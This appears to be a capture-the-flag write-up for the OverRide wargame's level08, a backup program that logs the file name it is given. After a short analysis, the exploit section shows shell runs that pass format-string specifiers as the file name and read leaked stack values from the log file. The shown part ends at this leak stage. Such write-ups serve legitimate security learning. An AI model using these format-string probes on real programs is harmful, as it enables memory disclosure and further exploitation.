# level08

1. [Analysis](#analysis)
2. [Exploit](#exploit)

## Analysis

```
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Full RELRO      Canary found      NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level08/level08
```

The program take one argument: a file name. It opens the `./backups/.log` and the file pointed by the only argument. It
copies char by char the content of the argument into a new file in `./backups/` and close everything.

## Exploit

```console
level08@OverRide:~$ ./level08 `python -c 'print "%08x" * 10'` ; cat backups/.log
ERROR: Failed to open %08x%08x%08x%08x%08x%08x%08x%08x%08x%08x
LOG: Starting back up: ffffffec000000ec00400d6cffffffffffffe8c800400d960060301072617453636162206666203a
```

```console
level08@OverRide:~$ ./level08 `python -c 'print "AAAA" + "%08x" * 100'` ; cat backups/.log
ERROR: Failed to open AAAA%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x
LOG: Starting back up: AAAAffffffec000000ec00400d6cffffffffffffe75c00400d960060301072617453636162204141203a6666666630303030643030346666666637656666643030343033303634373136323631363032313436363636303330333033303336363636363635363033303330333333313337333133363
```
